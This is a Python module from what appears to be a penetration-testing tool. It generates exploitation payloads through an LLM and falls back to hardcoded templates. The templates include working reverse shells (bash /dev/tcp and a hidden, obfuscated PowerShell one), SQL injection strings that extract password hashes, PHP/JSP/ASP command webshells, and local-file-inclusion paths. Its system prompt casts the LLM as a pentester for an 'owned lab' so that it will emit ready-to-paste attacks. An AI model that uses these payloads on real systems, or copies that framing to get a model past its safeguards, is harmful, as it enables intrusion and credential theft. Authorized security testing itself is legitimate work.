"""AI payload generator for Brutal Mode.

Uses the configured LLM (OpenRouter) to produce target-specific exploitation
payloads (reverse shells, SQLi variants, webshells) with a deterministic
offline fallback when no API key is configured. Results are cached per
(vulnerability, os, target-hash) and every generation is logged to the
``brutal_ops`` table.
"""

import hashlib
import logging
from typing import Any

from app.brutal_sessions import BrutalSession
from app.config import get_settings
from app.services.openrouter_client import call_openrouter

logger = logging.getLogger("phantomscan.brutal_ai")

SYSTEM_PROMPT = (
    "You are a professional penetration tester building payloads for an authorized "
    "security assessment lab (PhantomBank Lab). The target is a training application "
    "the user owns. Produce a single concrete payload, ready to paste, with a one-line "
    "explanation of how it works. Never include instructions for illegal activity — "
    "the lab is simulated and owned."
)

OFFLINE_PAYLOADS: dict[str, dict[str, str]] = {
    "reverse_shell": {
        "linux": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "windows": "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);iex $d}\"",
    },
    "sqli": {
        "sqlite": "' UNION SELECT username, password_hash FROM users --",
        "mysql": "' UNION SELECT username, password_hash FROM users -- -",
        "postgresql": "' UNION SELECT username, password_hash FROM users --",
    },
    "webshell": {
        "php": "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>",
        "jsp": "<% if(request.getParameter(\"cmd\")!=null){%><pre><%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%></pre><%}%>",
        "asp": "<% execute request(\"cmd\") %>",
    },
    "lfi": {
        "passwd": "/etc/passwd",
        "log_poison": "/var/log/apache2/access.log",
        "php_filter": "php://filter/convert.base64-encode/resource=config.php",
    },
}


class AIPayloadGenerator:
    """Generates (and caches) AI-assisted payloads per engagement."""

    _cache: dict[str, dict[str, str]] = {}

    def __init__(self, session: BrutalSession) -> None:
        self.session = session
        self.settings = get_settings()

    @staticmethod
    def _cache_key(vuln_type: str, os_name: str, target: str) -> str:
        return hashlib.sha256(f"{vuln_type}|{os_name}|{target}".encode("utf-8")).hexdigest()[:24]

    async def generate(self, vuln_type: str, os_name: str, prompt_hint: str = "") -> dict[str, str]:
        """Return a payload dict {payload, explanation, cached} for the request."""
        key = self._cache_key(vuln_type, os_name, self.session.target_url)
        cached = self._cache.get(key)
        if cached:
            await self.session.log_op(
                "ai_payload",
                "success",
                f"AI payload served from cache ({vuln_type}/{os_name})",
                payload=cached.get("payload", "")[:8000],
            )
            return {**cached, "cached": True}

        if self.settings.openrouter_api_key:
            try:
                prompt = (
                    f"Generate a {os_name} {vuln_type} payload for a Windows/UNIX lab app "
                    f"that runs the PhantomBank stack. {prompt_hint}".strip()
                )
                generated = await call_openrouter(
                    prompt,
                    system_prompt=SYSTEM_PROMPT,
                    max_tokens=300,
                    timeout=25.0,
                )
                payload, explanation = self._parse_llm_output(generated)
                if not payload.strip():
                    logger.warning("AI payload empty, using offline fallback")
                    result = {**self._offline(vuln_type, os_name), "cached": False}
                else:
                    result = {"payload": payload, "explanation": explanation, "cached": False}
            except Exception as exc:
                logger.warning("AI payload generation failed, using offline fallback: %s", exc)
                result = {**self._offline(vuln_type, os_name), "cached": False}
        else:
            result = {**self._offline(vuln_type, os_name), "cached": False}

        if result.get("payload", "").strip():
            self._cache[key] = result
        await self.session.log_op(
            "ai_payload",
            "success",
            f"AI payload generated for {vuln_type} on {os_name}",
            payload=result.get("payload", "")[:8000],
        )
        return result

    def _offline(self, vuln_type: str, os_name: str) -> dict[str, str]:
        category = OFFLINE_PAYLOADS.get(vuln_type, OFFLINE_PAYLOADS["reverse_shell"])
        platform_key = os_name.lower()
        payload = (
            category.get(platform_key)
            or category.get("linux")
            or next(iter(category.values()))
        )
        return {
            "payload": payload,
            "explanation": f"Offline template payload for {vuln_type} ({os_name}). "
            "Configure OPENROUTER_API_KEY for AI-generated variants.",
        }

    @staticmethod
    def _parse_llm_output(text: str) -> tuple[str, str]:
        lines = [line for line in text.splitlines() if line.strip()]
        payload_lines: list[str] = []
        explanation = ""
        in_payload = False
        for line in lines:
            stripped = line.strip()
            if stripped.startswith("```"):
                in_payload = not in_payload
                continue
            if in_payload:
                payload_lines.append(line)
            elif stripped.lower().startswith(("explanation", "how it works", "why")):
                explanation = stripped.split(":", 1)[-1].strip()
        payload = "\n".join(payload_lines).strip()
        if not payload:
            payload = text.strip()[:2000]
        return payload, explanation